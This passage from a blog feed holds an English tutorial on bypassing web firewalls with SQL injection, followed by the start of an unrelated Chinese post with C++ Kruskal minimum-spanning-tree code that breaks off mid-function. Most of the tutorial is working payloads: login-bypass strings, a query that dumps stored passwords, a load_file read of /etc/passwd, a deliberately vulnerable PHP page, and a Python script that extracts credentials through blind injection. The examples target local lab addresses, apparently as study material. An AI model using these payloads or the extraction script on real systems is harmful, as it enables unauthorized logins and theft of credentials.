you need something processing integer, <span class="keyword">in</span> that time you can <span class="keyword">use</span> bitwise  operations and arithmetic operations.</span><br><span class="line"></span><br><span class="line">Once I'll show bitwise operation example.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Or bitwise operation is well known <span class="keyword">for</span> any programmer. And <span class="keyword">as</span> I told you before, '' is 0, <span class="keyword">if</span> you operate <span class="string">"0 bitwise OR 0"</span>, the result is 0. <span class="keyword">So</span> the following operation succeed <span class="keyword">log</span> <span class="keyword">on</span> <span class="keyword">as</span> the False SQL Injection.</span><br><span class="line">'|0#</span><br><span class="line"></span><br><span class="line">Naturally, you can <span class="keyword">use</span> AND operation.</span><br><span class="line">'&amp;0#</span><br><span class="line"></span><br><span class="line">This is the attack using XOR</span><br><span class="line">'^0#</span><br><span class="line"></span><br><span class="line">Also using shift operation is enable.</span><br><span class="line">'&lt;&lt;0#</span><br><span class="line">'&gt;&gt;0#</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> you apply like those bitwise operations, you can <span class="keyword">use</span> variable attack methods.</span><br><span class="line">'&amp;''#</span><br><span class="line">'%11&amp;1#</span><br><span class="line">'&amp;1&amp;1#</span><br><span class="line">'|0&amp;1#</span><br><span class="line">'&lt;&lt;0|0#</span><br><span class="line">'&lt;&lt;0&gt;&gt;0#</span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> this time, I will show <span class="string">"False SQL Injection"</span> using arithmetic operations.</span><br><span class="line"><span class="keyword">If</span> the result is 0 using arithmetic operation with '', attack will be success. The following is the example using arithmetic operation.</span><br><span class="line"></span><br><span class="line">'*9#</span><br><span class="line">Multiplication</span><br><span class="line"></span><br><span class="line">'/9#</span><br><span class="line">Division.</span><br><span class="line"></span><br><span class="line">'%9#</span><br><span class="line"><span class="literal">Mod</span></span><br><span class="line"></span><br><span class="line">'+0#</span><br><span class="line">Addition</span><br><span class="line"></span><br><span class="line">'-0#</span><br><span class="line">Subtraction</span><br><span class="line"></span><br><span class="line">Significant point is that the result has to be under <span class="keyword">one</span>. Also you can attack <span class="keyword">as</span> follow.</span><br><span class="line">'+2+5-7#</span><br><span class="line">'+0+0-0#</span><br><span class="line">'-0-0-0-0-0#</span><br><span class="line">'*9*8*7*6*5#</span><br><span class="line">'/2/3/4#</span><br><span class="line">'%12%34%56%78#</span><br><span class="line">'<span class="comment">/**/</span>+<span class="comment">/**/</span>0#</span><br><span class="line">'-----0#</span><br><span class="line">'+++0+++++0*0#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Next attack is it using fucntion. <span class="keyword">In</span> this document, I can't show all the functions. Because this attack is not difficult, you can <span class="keyword">use</span> the <span class="string">"True, False SQL Injection" attack with function as much as you want. And whether this attack is "True SQL Injection" or "False SQL Injection"</span> is decided <span class="keyword">on</span> the last operation after <span class="keyword">return</span> of function.</span><br><span class="line">'&lt;hex(1)#</span><br><span class="line">'=left(0x30,1)#</span><br><span class="line">'=right(0,1)#</span><br><span class="line">'!=curdate()#</span><br><span class="line">'-<span class="literal">reverse</span>(0)#</span><br><span class="line">'=<span class="literal">ltrim</span>(0)#</span><br><span class="line">'&lt;<span class="literal">abs</span>(1)#</span><br><span class="line">'*<span class="literal">round</span>(1,1)#</span><br><span class="line">'&amp;left(0,0)#</span><br><span class="line">'*<span class="literal">round</span>(0,1)*<span class="literal">round</span>(0,1)#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Also, you can <span class="keyword">use</span> attack using space <span class="keyword">in</span> function name. But you are able to <span class="keyword">use</span> the space with only some function.</span><br><span class="line">'=upper     (0)#</span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> this time, SQL keyword is method. This method is also decided <span class="keyword">as</span> True or False Injection according to case.</span><br><span class="line">' &lt;1 and 1#</span><br><span class="line">'xor 1#</span><br><span class="line">'div 1#</span><br><span class="line">'is not null#</span><br><span class="line">admin' <span class="keyword">order</span> <span class="keyword">by</span>'</span><br><span class="line">admin' group <span class="keyword">by</span>'</span><br><span class="line">'like 0#</span><br><span class="line">'between 1 and 1#</span><br><span class="line">'regexp 1#</span><br><span class="line"></span><br><span class="line">Inputting id or password <span class="keyword">in</span> the field without annotaion is possible <span class="keyword">about</span> True, False SQL Injection. Normal Web Firewalls filter #, --, <span class="comment">/**/</span>, <span class="keyword">so</span> the method is <span class="keyword">more</span> effective <span class="keyword">in</span> the Web Firewalls.</span><br><span class="line">ID  : '='</span><br><span class="line">PASS: '='</span><br><span class="line"></span><br><span class="line">ID  : '&lt;&gt;'1</span><br><span class="line">PASS: '&lt;&gt;'1</span><br><span class="line"></span><br><span class="line">ID  : '&gt;1='</span><br><span class="line">PASS: '&gt;1='</span><br><span class="line"></span><br><span class="line">ID  : 0'='0</span><br><span class="line">PASS: 0'='0</span><br><span class="line"></span><br><span class="line">ID  : '&lt;1 and 1&gt;'</span><br><span class="line">PASS: '&lt;1 and 1&gt;'</span><br><span class="line"></span><br><span class="line">ID  : '&lt;&gt;ifnull(1,2)='1</span><br><span class="line">PASS: '&lt;&gt;ifnull(1,2)='1</span><br><span class="line"></span><br><span class="line">ID  : '=<span class="literal">round</span>(0,1)='1</span><br><span class="line">PASS: '=<span class="literal">round</span>(0,1)='1</span><br><span class="line"></span><br><span class="line">ID  : '*0*'</span><br><span class="line">PASS: '*0*'</span><br><span class="line"></span><br><span class="line">ID  : '+'</span><br><span class="line">PASS: '+'</span><br><span class="line"></span><br><span class="line">ID  : '-'</span><br><span class="line">PASS: '-'</span><br><span class="line"></span><br><span class="line">ID  :'+1-1-'</span><br><span class="line">PASS:'+1-1-'</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">All attacks used <span class="keyword">in</span> the documentation will be <span class="keyword">more</span> effective with using bracket when detouring web firewall.</span><br><span class="line">'+(0-0)#</span><br><span class="line">'=0&lt;&gt;((<span class="literal">reverse</span>(1))-(<span class="literal">reverse</span>(1)))#</span><br><span class="line">'&lt;(8*7)*(6*5)*(4*3)#</span><br><span class="line">'&amp;(1+1)-2#</span><br><span class="line">'&gt;(0-100)#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Let's see normal SQL Injection attack.</span><br><span class="line">' or 1=1#</span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> this is translated <span class="keyword">in</span> hexdemical, the result is <span class="keyword">as</span> follow.</span><br><span class="line">http:<span class="comment">//127.0.0.1/login.php?id=%27%20%6f%72%20%31%3d%31%23&amp;password=1234</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Like attack above is basically filtered. <span class="keyword">So</span> that's not good attack, I will try detour filtering using <span class="keyword">tab</span>(%09) standing <span class="keyword">in</span> <span class="keyword">for</span> space(%20). <span class="keyword">In</span> truth, you can <span class="keyword">use</span> %a0 <span class="keyword">on</span> behalf of %09.</span><br><span class="line"></span><br><span class="line">The possible values are <span class="keyword">as</span> follow.</span><br><span class="line">%09</span><br><span class="line">%0a</span><br><span class="line">%0b</span><br><span class="line">%0c</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">%23%0a</span><br><span class="line">%23%48%65%6c%6c%6f%20%77%6f%6c%72%64%0a</span><br><span class="line"></span><br><span class="line">The following is the example using %a0 instead of %20.</span><br><span class="line">http:<span class="comment">//127.0.0.1/login.php?id=%27%a0%6f%72%a0%31%3d%31%23&amp;password=1234</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">In</span> this time, I will show <span class="string">"Blind SQL injection"</span> attack, this attack can't detour web firewall filtering, but some attacker tend to think that Blind SQL Injection attack is impossible to <span class="keyword">log</span> <span class="keyword">on</span> page. <span class="keyword">So</span> I decided showing this subject.</span><br><span class="line"></span><br><span class="line">The following attack code can be used <span class="keyword">on</span> <span class="keyword">log</span> <span class="keyword">on</span> page. And the page will show id and password.</span><br><span class="line">'union select 1,group_concat(password),3 from users#</span><br><span class="line"></span><br><span class="line">This attack code brings /etc/password information.</span><br><span class="line">'union select 1,load_file(0x2f6574632f706173737764),3 from users#</span><br><span class="line"></span><br><span class="line">Dare I say it without union select statement using Blind SQL injection with and operation is possible.</span><br><span class="line"></span><br><span class="line">The result of record are three.</span><br><span class="line">admin' and (select <span class="keyword">count</span>(*) from users)=3#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Let's attack detouring web firewall using Blind SQL Injection. The following is vulnerable code to Blind SQL Injection.</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*** info.php ***/</span></span><br><span class="line"></span><br><span class="line">  <span class="label">$n</span> = <span class="label">$_GET</span>['num'];</span><br><span class="line">  <span class="keyword">if</span>(empty(<span class="label">$n</span>))&#123;</span><br><span class="line">    <span class="label">$n</span> = 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="label">$dbhost</span> = 'localhost';</span><br><span class="line">  <span class="label">$dbuser</span> = 'root';</span><br><span class="line">  <span class="label">$dbpass</span> = 'root';</span><br><span class="line">  <span class="label">$database</span> = 'injection_db';</span><br><span class="line"></span><br><span class="line">  <span class="label">$db</span> = mysql_connect(<span class="label">$host</span>, <span class="label">$dbuser</span>, <span class="label">$dbpass</span>);</span><br><span class="line">  mysql_select_db(<span class="label">$database</span>,<span class="label">$db</span>);</span><br><span class="line">  <span class="label">$sql</span> = mysql_query(<span class="string">"select * from `users` where num="</span>.<span class="label">$n</span>) or die (mysql_error());</span><br><span class="line">  <span class="label">$info</span> = @mysql_fetch_row(<span class="label">$sql</span>);</span><br><span class="line">  echo <span class="string">"&lt;body bgcolor=#000000&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;h1&gt;&lt;font color=#FFFFFF&gt;wh1ant&lt;/font&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;font color=#2BF70E&gt; site for blind SQL injection test&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;h1&gt;&lt;font color=#2BF70E&gt;num: &lt;/font&gt;&lt;font color=#D2691E&gt;".$info[0]."&lt;/font&gt;&lt;/h1&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;h1&gt;&lt;font color=#2BF70E&gt;user: &lt;/font&gt;&lt;font color=#D2691E&gt;".$info[1]."&lt;/font&gt;"</span>;</span><br><span class="line">  echo <span class="string">"&lt;body&gt;"</span>;</span><br><span class="line">  mysql_close(<span class="label">$db</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Basic Blind SQL Injection is <span class="keyword">as</span> follow <span class="keyword">on</span> like above.</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1 and 1=0</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1 and 1=1</span></span><br><span class="line"></span><br><span class="line">But using = operation is possible <span class="keyword">for</span> Blind SQL Injection.</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//192.168.137.129/info.php?num=1=0</span></span><br><span class="line">http:<span class="comment">//192.168.137.129/info.php?num=1=1</span></span><br><span class="line"></span><br><span class="line">Also other operation is possible naturally.</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1&lt;&gt;0</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1&lt;&gt;1</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1&lt;0</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1&lt;1</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1*0*0*1</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1*0*0*0</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1%1%1%0</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1%1%1%1</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1 div 0</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1 div 1</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1 regexp 0</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1 regexp 1</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1^0</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=1^1</span></span><br><span class="line"></span><br><span class="line">Attack example:</span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=0^(locate(0x61,(select id from users where num=1),1)=1)</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=0^(select position(0x61 in (select id from users where num=1))=1)</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=0^(reverse(reverse((select id from users where num=1)))=0x61646d696e)</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=0^(lcase((select id from users where num=1))=0x61646d696e)</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=0^((select id from users where num=1)=0x61646d696e)</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=0^(id regexp 0x61646d696e)</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=0^(id=0x61646d696e)</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=0^((select octet_length(id) from users where num=1)=5)</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/info.php?num=0^((select character_length(id) from users where num=1)=5)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> I will show all attack, I have to take much time, <span class="keyword">So</span> I stopped <span class="keyword">in</span> this time. Blind SQL Injection is difficult manually, <span class="keyword">So</span> using tool will be <span class="keyword">more</span> effective. I will show a tool made python, this is <span class="keyword">an</span> example using ^(XOR) bitwise operation. <span class="keyword">In</span> <span class="keyword">order</span> to make the most of detouring the web firewall, I replaced space with %0a.</span><br><span class="line"></span><br><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">### blind.py ###</span><br><span class="line"></span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def put_data(true_url, true_result, field, index, length):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(1, length+1):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(32, 127):</span><br><span class="line">			attack_url = true_url + <span class="string">"^(%%a0locate%%a0%%a0(0x%x,(%%a0select%%a0%s%%a0%%a0from%%a0%%a0users%%a0where%%a0num=%d),%d)=%d)"</span> % (j,field,index,i,i)</span><br><span class="line">			attack_open = urllib.urlopen(attack_url)</span><br><span class="line">			attack_result = attack_open.<span class="keyword">read</span>()</span><br><span class="line">			attack_open.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> attack_result==true_result:</span><br><span class="line">				ch = <span class="string">"%c"</span> % <span class="literal">j</span></span><br><span class="line">				sys.stdout.write(ch)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"\t\t"</span>,</span><br><span class="line"></span><br><span class="line">def get_length(false_url, false_result, field, index):</span><br><span class="line">	i=0</span><br><span class="line">	<span class="keyword">while</span> 1:</span><br><span class="line">		data_length_url = false_url + <span class="string">"^(%%a0(select%%a0octet_length%%a0%%a0(%s)%%a0from%%a0users%%a0where%%a0num%%a0=%%a0%d)%%a0=%%a0%d)"</span> % (field,index,i)</span><br><span class="line">		data_length_open = urllib.urlopen(data_length_url)</span><br><span class="line">		data_length_result = data_length_open.<span class="keyword">read</span>()</span><br><span class="line">		data_length_open.<span class="keyword">close</span>()</span><br><span class="line">		<span class="keyword">if</span> data_length_result==false_result:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">i</span></span><br><span class="line">		i+=1</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/info.php"</span></span><br><span class="line"></span><br><span class="line">true_url = url + <span class="string">"?num=1"</span></span><br><span class="line">true_open = urllib.urlopen(true_url)</span><br><span class="line">true_result = true_open.<span class="keyword">read</span>()</span><br><span class="line">true_open.<span class="keyword">close</span>()</span><br><span class="line">	</span><br><span class="line">false_url = url + <span class="string">"?num=0"</span></span><br><span class="line">false_open = urllib.urlopen(false_url)</span><br><span class="line">false_result = false_open.<span class="keyword">read</span>()</span><br><span class="line">false_open.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"num\t\tid\t\tpassword"</span></span><br><span class="line">fields = <span class="string">"num", "id", "password"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(1, 4):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(0, 3):</span><br><span class="line">		length = get_length(false_url, false_result, fields[j], i)</span><br><span class="line">		length = put_data(false_url, true_result, fields[j], i, length)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line">To its regret, the attack <span class="keyword">test</span> is stopped <span class="keyword">for</span> <span class="keyword">no</span> time, <span class="keyword">if</span> anyone not this writer studies some attack codes additionally, it will be easy <span class="keyword">for</span> him to develop the attack.</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在sctf的pt100中学到的一些新姿势。<br>很简单的猜到后台。然后有一个基础的身份验证。神队友使用了黑魔法一样就绕过了。我补了一下姿势。网上查找了一下。是<code>iis＋php</code>的<a href="[http://packetstormsecurity.com/files/113497/iis-bypass.txt]">bypass</a><br>]]>
    
    </summary>
    
      <category term="iis+php_bypass" scheme="http://edward-l.github.io/tags/iis-php-bypass/"/>
    
      <category term="sctf" scheme="http://edward-l.github.io/tags/sctf/"/>
    
      <category term="sql_injection" scheme="http://edward-l.github.io/tags/sql-injection/"/>
    
      <category term="writeup" scheme="http://edward-l.github.io/categories/writeup/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[mintree]]></title>
    <link href="http://edward-l.github.io/2014/12/09/mintree/"/>
    <id>http://edward-l.github.io/2014/12/09/mintree/</id>
    <published>2014-12-09T07:30:16.000Z</published>
    <updated>2014-12-08T14:44:02.000Z</updated>
    <content type="html"><![CDATA[<p>1.本程序是用于实现最小生成树：若要在n个城市间建设通信网络，只需要架设n-1条线路即可。要想用最低的经济代价建设这个通信网，可以用网的最小生成树来解决。<br>2.用存储边的数组表示的无向网来表示n个城市间的通信线路，利用克鲁斯尔算法求网的最小生成树，定义数据类型MFSet，用来构造生成树过程中的连通分量。<br>3.程序以用户和计算机的对话方式执行，即在计算机终端上显示“提示信息”之后，由用户先在.txt文档中输入所需要测试的数据，然后运行程序，在程序运行结束之后会显示相应的运行结果，并会相应的生成输出的.txt的文件。<br>4.程序执行的命令包括：<br>    提前输入相应的测试数据；<br>    创建最小生成树；<br>    <a id="more"></a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;iostream&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;cstdlib&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;io.h&gt; </span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;fstream&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MAX_VERTEX_NUM 30 <span class="comment">// 最大顶点个数</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> VertexType<span class="comment">//顶点类型</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> vex;</span><br><span class="line">	<span class="keyword">int</span> parent;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> ArcCellType<span class="comment">//边的类型</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> adj;<span class="comment">// 权值</span></span><br><span class="line">	<span class="keyword">int</span> vi, vj;<span class="comment">//端点</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> MGraph<span class="comment">//无向图结构</span></span><br><span class="line">&#123;</span><br><span class="line">	 VertexType vexs[MAX_VERTEX_NUM]; <span class="comment">// 顶点向量</span></span><br><span class="line">	 ArcCellType arcs[MAX_VERTEX_NUM * (MAX_VERTEX_NUM - <span class="number">1</span>) / <span class="number">2</span> + <span class="number">1</span>];<span class="comment">//存储边的数组</span></span><br><span class="line">     <span class="keyword">int</span> vexnum, arcnum; <span class="comment">// 图的当前顶点数和弧数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> MFSet<span class="comment">//等价类结构</span></span><br><span class="line">&#123;</span><br><span class="line">	VertexType nodes[MAX_VERTEX_NUM];</span><br><span class="line">	<span class="keyword">int</span> r, n;<span class="comment">//根的位置和结点数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitMfset</span><span class="params">(MFSet &amp;S, MGraph G)</span><span class="comment">//初始化等价类</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	S.n = G.vexnum;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; S.n; i++)</span><br><span class="line">		S.nodes[i].parent = -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateVex</span><span class="params">(MGraph G, <span class="keyword">char</span> u)</span><span class="comment">//若G中存在顶点u,则返回该顶点在图中位置;否则返回-1</span></span><br><span class="line"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; G.vexnum; ++i)</span><br><span class="line">    	<span class="keyword">if</span>(u == G.vexs[i].vex)</span><br><span class="line">       		<span class="keyword">return</span> i;</span><br><span class="line">   <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateAN</span><span class="params">(MGraph &amp;G)</span><span class="comment">//构造无向网G</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i, j, k, w;</span><br><span class="line">	<span class="keyword">int</span> va, vb;  </span><br><span class="line">	FILE *graphlist;</span><br><span class="line"></span><br><span class="line">	graphlist = fopen(<span class="string">"mincstree.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">	<span class="built_in">fscanf</span>(graphlist, <span class="string">"%d"</span>, &amp;G.vexnum);</span><br><span class="line">    <span class="built_in">fscanf</span>(graphlist, <span class="string">"%d"</span>, &amp;G.arcnum);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; G.vexnum; ++i)<span class="comment">//构造顶点向量</span></span><br><span class="line">		<span class="built_in">fscanf</span>(graphlist, <span class="string">"%s"</span>, &amp;G.vexs[i].vex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(k = <span class="number">1</span>; k &lt;= G.arcnum; ++k)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fscanf</span>(graphlist, <span class="string">"%s %s %d"</span>, &amp;va,&amp;vb,&amp;w);	</span><br><span class="line">		i = LocateVex(G, va);</span><br><span class="line">		j = LocateVex(G, vb);</span><br><span class="line">		G.arcs[k].adj = w;</span><br><span class="line">		G.arcs[k].vi = i;</span><br><span class="line">		G.arcs[k].vj = j;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_mfset</span><span class="params">(MFSet &amp;S, <span class="keyword">int</span> i)</span><span class="comment">//查找i属于所在集合并返回</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> j,k,t;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(i &lt; <span class="number">0</span> || i &gt; S.n - <span class="number">1</span>) </span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;<span class="comment">//不属于S的任一子集</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(j = i; S.nodes[j].parent &gt;= <span class="number">0</span>; j = S.nodes[j].parent);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(k = i; k != j; k = t)<span class="comment">//i为输入节点，j为i的根，k为从i到根路径上的所有节点</span></span><br><span class="line">	&#123;</span><br><span class="line">		t = S.nodes[k].parent;</span><br><span class="line">		S.nodes[k].parent = j;<span class="comment">//设置k的双亲指向根结点</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_mfset</span><span class="params">(MFSet &amp;S, <span class="keyword">int</span> vi, <span class="keyword">int</span> vj)</span><span class="comment">//判断i j是否属于一个集合，是返回1，否则返回0</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(find_mfset(S, vi) == 